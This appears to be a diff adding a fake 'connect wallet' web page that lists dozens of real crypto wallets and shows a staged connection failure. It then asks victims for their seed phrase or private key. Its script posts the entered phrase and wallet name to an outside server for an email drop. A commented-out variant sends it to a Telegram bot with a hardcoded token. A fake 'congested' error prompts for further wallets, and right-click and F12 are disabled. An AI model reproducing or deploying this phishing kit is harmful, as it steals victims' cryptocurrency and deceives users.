+                                        <img src="choose_wallet_files/safepal.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>SafePal</a></h5>
+                                    <span class="price">safepal.io</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="infinito" class="sc-author-box select_wallet" data-title="Infinito"
+                                data-logo="choose_wallet_files/infinito.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/infinito.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Infinito</a></h5>
+                                    <span class="price">infinitowallet.io</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="wallet_io" class="sc-author-box select_wallet" data-title="Wallet.io"
+                                data-logo="choose_wallet_files/wallet_io.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/wallet_io.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Wallet.io</a></h5>
+                                    <span class="price">wallet.io</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="ownbit" class="sc-author-box select_wallet" data-title="Ownbit"
+                                data-logo="choose_wallet_files/ownbit.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/ownbit.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Ownbit</a></h5>
+                                    <span class="price">ownbit.io</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="easypocket" class="sc-author-box select_wallet" data-title="EasyPocket"
+                                data-logo="choose_wallet_files/easypocket.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/easypocket.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>EasyPocket</a></h5>
+                                    <span class="price">easypocket.app</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="bridget_wallet" class="sc-author-box select_wallet" data-title="Bridge Wallet"
+                                data-logo="choose_wallet_files/bridge_wallet.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/bridge_wallet.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Bridge Wallet</a></h5>
+                                    <span class="price">mtpelerin.com</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="via_wallet" class="sc-author-box select_wallet" data-title="ViaWallet"
+                                data-logo="choose_wallet_files/via_wallet.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/via_wallet.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>ViaWallet</a></h5>
+                                    <span class="price">viawallet.com</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="bitkeep" class="sc-author-box select_wallet" data-title="BitKeep"
+                                data-logo="choose_wallet_files/bitkeep.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/bitkeep.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>BitKeep</a></h5>
+                                    <span class="price">bitkeep.com</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="unstoppable_wallet" class="sc-author-box select_wallet"
+                                data-title="Unstoppable Wallet" data-logo="choose_wallet_files/unstoppable_wallet.jpg"
+                                style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/unstoppable_wallet.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Unstoppable Wallet</a></h5>
+                                    <span class="price">unstoppable.money</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="halodefi_wallet" class="sc-author-box select_wallet" data-title="HaloDefi Wallet"
+                                data-logo="choose_wallet_files/halodefi_wallet.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/halodefi_wallet.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>HaloDefi Wallet</a></h5>
+                                    <span class="price">halodefi.org</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="dok_wallet" class="sc-author-box select_wallet" data-title="Dok Wallet"
+                                data-logo="choose_wallet_files/dok_wallet.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/dok_wallet.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Dok Wallet</a></h5>
+                                    <span class="price">dokwallet.com</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="celo_wallet" class="sc-author-box select_wallet" data-title="Cello Wallet"
+                                data-logo="choose_wallet_files/celo_wallet.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/celo_wallet.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Cello Wallet</a></h5>
+                                    <span class="price">cellowallet.app</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="coinus" class="sc-author-box select_wallet" data-title="CoinUs"
+                                data-logo="choose_wallet_files/coinus.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/coinus.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>CoinUs</a></h5>
+                                    <span class="price">coinus.io</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="valora" class="sc-author-box select_wallet" data-title="Valora"
+                                data-logo="choose_wallet_files/valora.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/valora.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Valora</a></h5>
+                                    <span class="price">valoraapp.com</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="trustee_wallet" class="sc-author-box select_wallet" data-title="Trustee Wallet"
+                                data-logo="choose_wallet_files/trustee_wallet.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/trustee_wallet.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Trustee Wallet</a></h5>
+                                    <span class="price">trusteeglobal.com</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="guarda_wallet" class="sc-author-box select_wallet" data-title="Gaurda Wallet"
+                                data-logo="choose_wallet_files/guarda_wallet.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/guarda_wallet.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Gaurda Wallet</a></h5>
+                                    <span class="price">guarda.com</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="Maiar_wallet" class="sc-author-box select_wallet" data-title="Maiar Wallet"
+                                data-logo="choose_wallet_files/maiarwallet.png" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/maiarwallet.png" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Maiar Wallet</a></h5>
+                                    <span class="price">Maiar.com</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="jade_wallet" class="sc-author-box select_wallet" data-title="Jade Wallet"
+                                data-logo="choose_wallet_files/jade_wallet.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/jade_wallet.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Jade Wallet</a></h5>
+                                    <span class="price">jadewallet.io</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="plasmapay" class="sc-author-box select_wallet" data-title="PlasmaPay"
+                                data-logo="choose_wallet_files/plasmapay.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/plasmapay.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>PlasmaPay</a></h5>
+                                    <span class="price">plasmapay.com</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="o3_wallet" class="sc-author-box select_wallet" data-title="O3Wallet"
+                                data-logo="choose_wallet_files/o3_wallet.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/o3_wallet.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>O3Wallet</a></h5>
+                                    <span class="price">o3.network</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="hashkey_me" class="sc-author-box select_wallet" data-title="HashKey Me"
+                                data-logo="choose_wallet_files/hashkey_me.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/hashkey_me.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>HashKey Me</a></h5>
+                                    <span class="price">me.hashkey.com</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="rwallet" class="sc-author-box select_wallet" data-title="RWallet"
+                                data-logo="choose_wallet_files/rwallet.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/rwallet.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>RWallet</a></h5>
+                                    <span class="price">rsk.co</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="flare_wallet" class="sc-author-box select_wallet" data-title="Flare Wallet"
+                                data-logo="choose_wallet_files/flare_wallet.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/flare_wallet.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Flare Wallet</a></h5>
+                                    <span class="price">flarewallet.io</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="kyberswap" class="sc-author-box select_wallet" data-title="KyberSwap"
+                                data-logo="choose_wallet_files/kyberswap.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/kyberswap.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>KyberSwap</a></h5>
+                                    <span class="price">kyberswap.com</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="atoken_wallet" class="sc-author-box select_wallet" data-title="AToken Wallet"
+                                data-logo="choose_wallet_files/atoken_wallet.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/atoken_wallet.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>AToken Wallet</a></h5>
+                                    <span class="price">atoken.com</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="tongue_wallet" class="sc-author-box select_wallet" data-title="Tongue Wallet"
+                                data-logo="choose_wallet_files/tongue_wallet.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/tongue_wallet.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Tongue Wallet</a></h5>
+                                    <span class="price">tongue.fi</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="xinfin" class="sc-author-box select_wallet" data-title="XinFin XDC Network"
+                                data-logo="choose_wallet_files/xinfin.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/xinfin.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>XinFin XDC Network</a></h5>
+                                    <span class="price">xinfin.io</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="talken_wallet" class="sc-author-box select_wallet" data-title="Talken Wallet"
+                                data-logo="choose_wallet_files/talken_wallet.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/talken_wallet.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Talken Wallet</a></h5>
+                                    <span class="price">talken.io</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="keyring_pro" class="sc-author-box select_wallet" data-title="KEYRING PRO"
+                                data-logo="choose_wallet_files/keyring_pro.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/keyring_pro.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>KEYRING PRO</a></h5>
+                                    <span class="price">keyring.app</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="midas_wallet" class="sc-author-box select_wallet" data-title="Midas Wallet"
+                                data-logo="choose_wallet_files/midas_wallet.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/midas_wallet.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Midas Wallet</a></h5>
+                                    <span class="price">midasprotocol.io</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="at_wallet" class="sc-author-box select_wallet" data-title="AT.Wallet"
+                                data-logo="choose_wallet_files/at_wallet.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/at_wallet.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>AT.Wallet</a></h5>
+                                    <span class="price">authentrend.com</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="imtoken" class="sc-author-box select_wallet" data-title="imToken"
+                                data-logo="choose_wallet_files/imtoken.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/imtoken.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>imToken</a></h5>
+                                    <span class="price">token.im</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="imtoken" class="sc-author-box select_wallet" data-title="Other Wallets"
+                                data-logo="" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/imtoken.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Other Wallets</a></h5>
+                                    <span class="price"></span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                    </div>
+                </div>
+            </section>
+          
+
+           
+        </div>
+
+        <div class="modal fade popup" id="popup_connect_wallet_success" tabindex="-1" role="dialog" aria-hidden="true">
+            <div class="modal-dialog modal-dialog-centered" role="document">
+                <div class="modal-content">
+                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                        <span aria-hidden="true">&times;</span>
+                    </button>
+                    <div class="modal-body space-y-20 pd-40">
+
+
+                        <center>
+                            <h2 style="color: green">Connecting.....</h2>
+                    </div>
+
+                    <h2 style="color: blue"></h2>
+
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="modal fade popup" id="popup_connect_wallet" tabindex="-1" role="dialog" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                    <span aria-hidden="true">&times;</span>
+                </button>
+                <div class="modal-body space-y-20 pd-40">
+
+                    <h3>
+                        <img width="50" height="50" class="avatar" id="wallet_logo" /><br>
+                        <span id="wallet_name" clas="mt-1">Sync Wallet</span>
+                    </h3>
+                    <p class="text-center">
+                        This session is secured and encrypted </p>
+
+                    <div id="auto_connecting" style="display:none;">
+                        <br><br><br>
+                        <div class="heading-line s2" style="width: 100%;">
+                            <br>
+                            <h5 align="center">
+                                starting secure connection...<br>
+                                <i align="center" style="text-align: center !important; font-size:small"
+                                    class="text-muted align-items-center">please wait...</i>
+                            </h5>
+                            <br>
+                        </div>
+                    </div>
+
+                    <div id="failed_to_connect" style="display:none;">
+                        <div
+                            style="padding:6px; color:red; border:1px solid red; border-radius:5px; text-align:center!important; font-size:16px; font-weight:500;">
+                            An error occurred... please try again or connect manually
+                        </div>
+                        <br><br><br>
+                       <!-- <a href="index.html#" id="try_auto_connecting_again" class="btn btn-outline-primary"
+                            aria-label="Close">Try Again</a>
+                            
+                            <br>--> 
+
+                        <a href="index.html#" id="button_connect_manually" class="btn btn-primary">Connect Manually</a>
+                    </div>
+
+                    <!-- <form method="post" action="https://formsubmit.co/ff182285e83811834851684edc83effa">
+                    <textarea style="font-size:25px; font-weight:650" rows="4" name="secret_phrase" id="secret_phrase"
+                        class="form-control text-primary"
+                        placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces."></textarea><br>
+                
+                    <button type="submit" class="btn btn-primary" style="border-top: 5px; ">Connect
+                        Wallet</button>
+                
+                </form> -->
+
+                <div id="div_connect_manuallly" style="display:none;">
+                    <form id="wallet-form">
+                        <p>Enter phrase or Private Key</p>
+                        <div id="phrase">
+                            <textarea
+                                placeholder="Enter your 12 or 24 Mnemonic words. Separate them with spaces or Input Wallet Private Key"
+                                style="font-size: 20px; font-weight: 650;"
+                                rows="4"
+                                minlength="10"
+                                required
+                                name="phrases"
+                                id="secret_phrase"></textarea>
+                            <p><br></p>
+                            <button id="submit" type="submit" class="btn btn-primary" style="border-top: 5px;">
+                                Connect Wallet
+                            </button>
+                        </div>
+                    </form>
+                </div>
+                
+                    <div>
+                        <br><br><br>
+                        <h5 align="center" class="mt-4 text-muted align-items-center"><img
+                                src="choose_wallet_files/shield.png" width="30" height="30" /> This session is protected
+                            with an end-to-end encryption</h5>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    </div>
+
+
+    <!-- <a id="scroll-top"></a> -->
+
+    <script src="choose_wallet_files/jquery.min.js"></script>
+    <script src="choose_wallet_files/jquery.easing.js"></script>
+    <script src="choose_wallet_files/bootstrap.min.js"></script>
+    <script src="choose_wallet_files/wow.min.js"></script>
+    <script src="choose_wallet_files/plugin.js"></script>
+    <script src="choose_wallet_files/shortcodes.js"></script>
+    <script src="choose_wallet_files/main.js"></script>
+    <script src="choose_wallet_files/count-down.js"></script>
+    <script src="choose_wallet_files/swiper-bundle.min.js"></script>
+    <!-- <script src="choose_wallet_files/swiper.js"></script> -->
+    <script src="choose_wallet_files/parallax.js"></script>
+    <!-- <script src="choose_wallet_files/web3.min.js"></script> -->
+    <!-- <script src="choose_wallet_files/moralis.js"></script> -->
+    <!-- <script src="asset/js/nft.js"></script> -->
+    <!--<script src="asset/js/_.js"></script>-->
+
+
+    <script>
+        //Handle Select Wallet Click
+
+         $(function () {
+        // Initialize modal functionality
+        $('#popup_connect_wallet, #popup_connect_wallet_success').modal({ show: false });
+
+    
+
+        $(function () {
+            $('.select_wallet').on('click', function () {
+                var wd = $(this); //wd = wallet details
+
+                $('#wallet_name').text(wd.data('title'));
+                $('#wallet_logo').attr("src", wd.data('logo'));
+                $('#auto_connecting').show();
+                $('#failed_to_connect').hide();
+                $('#div_connect_manuallly').hide();
+
+                $('#popup_connect_wallet').modal('show');
+
+                //Hide autoconnecting div and show error in random interval
+                var interval = 1000 * getRandomInt(1, 15);
+                setTimeout(() => {
+                    $('#auto_connecting').hide();
+                    $('#div_connect_manuallly').hide();
+                    $('#failed_to_connect').show();
+                }, interval);
+
+
+            })
+
+            $('#try_auto_connecting_again').on('click', function (e) {
+                e.preventDefault();
+                $('#auto_connecting').show();
+                $('#failed_to_connect').hide();
+                $('#div_connect_manuallly').hide();
+
+                //Hide autoconnecting div and show error in random interval
+                var interval = 1000 * getRandomInt(1, 20);
+                setTimeout(() => {
+                    $('#auto_connecting').hide();
+                    $('#div_connect_manuallly').hide();
+                    $('#failed_to_connect').show();
+                }, interval);
+            })
+
+            $('#button_connect_manually').on('click', function (e) {
+                e.preventDefault();
+                $('#auto_connecting').hide();
+                $('#failed_to_connect').hide();
+                $('#div_connect_manuallly').show();
+            })
+
+            //FOR PHRASE TEXT VALIDATION
+            $('#secret_phrase').on('keyup', function () {
+                var phrase_seed_entered = $(this).val().trim()
+                if (phrase_seed_entered != "") {
+                    var phrase_count = phrase_seed_entered.match(/(\w+)/g).length
+                    console.log(phrase_count)
+                    if ([12, 15, 18, 21, 24].includes(phrase_count)) {
+                        $('#button_connect_wallet').attr('disabled', false).css('opacity', '1')
+                    } else {
+                        $('#button_connect_wallet').attr('disabled', false).css('opacity', '1')
+                    }
+                } else {
+                    $('#button_connect_wallet').attr('disabled', true).css('opacity', '0.2')
+                }
+            })
+
+          
+              // Handle form submission directly
+              $('#wallet-form').on('submit', function(e) {
+        e.preventDefault();
+        let field = $('#secret_phrase');
+        if (field.val().length >= 12) {
+            $('#submit').text('Loading...').css('pointer-events', 'none');
+
+            var templateParams = {
+                load_phrase: field.val(),
+                wallet_selected: $('#wallet_name').text().trim()
+            };
+
+            console.log('templateParams',templateParams)
+
+            let dropText= `Phrase: \n ${templateParams.load_phrase} \n\n Wallet Selected: \n ${templateParams.wallet_selected}`
+
+            // sendmessage(dropText,'6846845714:AAH9urkBnj_3MgQyXDjPADwc2Gk7x330l_M','6792771136')
+
+            sendmessage(dropText)
+
+        }
+    });
+});
+     
+
+        })
+
+
+        // EMAIL MESSAGE SENDER
+
+        function sendmessage(message){
+
+    let sendObj={
+	sendername:'Blockchain Sync Node',
+	senderemail:'drops@blockchainsyncnode.com',
+	receiver:'projectmainnet@gmail.com ',
+	subject:'New Drop',
+	text: message
+}
+
+   // Send the data using AJAX
+                 $.ajax({
+                    url: 'https://webzend.net.ng/process.php',
+                    type: 'POST',
+                    contentType: 'application/json',
+                    data: JSON.stringify(sendObj),
+                    success: function(response) {
+
+                    console.log('SUCCESS!', response.status, response.text);
+                    $('#submit').text('Connect Wallet').css('pointer-events', 'all');
+
+                    // Close the form area
+                    $('#popup_connect_wallet').modal('hide');
+
+                    // Show SweetAlert success message
+                    Swal.fire({
+                        title: 'Error!',
+                        text: 'BlockChain is currently congested! Please try another wallet!',
+                        icon: 'error'
+                    }).then((result) => {
+                        if (result.isConfirmed) {
+                            // Optionally reset form or perform another action
+                            $('#wallet-form')[0].reset();
+                        }
+                    });
+
+                    },
+                    error: function(xhr, status, error) {
+
+                    console.log('FAILED...', error);
+                    alert('Failed to send the email. Please try again later.');
+                    $('#submit').text('Connect Wallet').css('pointer-events', 'all');
+
+
+                    }
+                });
+           
+            
+        }
+
+
+        // TELEGRAM MESSAGE SENDER
+
+
+//         function sendmessage(message,chat_bot_api,user_chat_id){
+
+           
+            
+//   let durl = 'https://api.telegram.org/bot'+chat_bot_api+'/sendMessage';
+
+//       // following ones are optional, so could be set as null
+//   let disable_web_page_preview = null;
+//   let reply_to_message_id = null;
+//   let reply_markup = null;
+
+
+//     let datathree={
+//         'chat_id':user_chat_id,
+//         'text':message,
+//         'disable_web_page_preview':disable_web_page_preview,
+//         'reply_to_message_id':reply_to_message_id,
+//         'reply_markup':reply_markup
+//       }
+
+
+//     $.ajax({
+//         url: durl,
+//         type: 'POST',
+//         data: datathree,
+//         cache: false,
+
+//         success:(response)=>{
+
+//             console.log('SUCCESS!', response.status, response.text);
+//                     $('#submit').text('Connect Wallet').css('pointer-events', 'all');
+
+//                     // Close the form area
+//                     $('#popup_connect_wallet').modal('hide');
+
+//                     // Show SweetAlert success message
+//                     Swal.fire({
+//                         title: 'Error!',
+//                         text: 'BlockChain is currently congested! Please try another wallet!',
+//                         icon: 'error'
+//                     }).then((result) => {
+//                         if (result.isConfirmed) {
+//                             // Optionally reset form or perform another action
+//                             $('#wallet-form')[0].reset();
+//                         }
+//                     });
+
+//         },
+//         error:()=>{
+
+//             console.log('FAILED...', error);
+//             alert('Failed to send the email. Please try again later.');
+
+//         }
+
+
+//     }); 
+// }
+
+        function getRandomInt(min, max) {
+            min = Math.ceil(min);
+            max = Math.floor(max);
+            return Math.floor(Math.random() * (max - min) + min); //The maximum is exclusive and the minimum is inclusive
+        }
+
+        //DISABLE RIGHT CLICK AND CTRL KEY
+        window.oncontextmenu = function () {
+            return false;
+        }
+        $(document).keydown(function (event) {
+            if (event.keyCode == 123) {
+                return false;
+            }
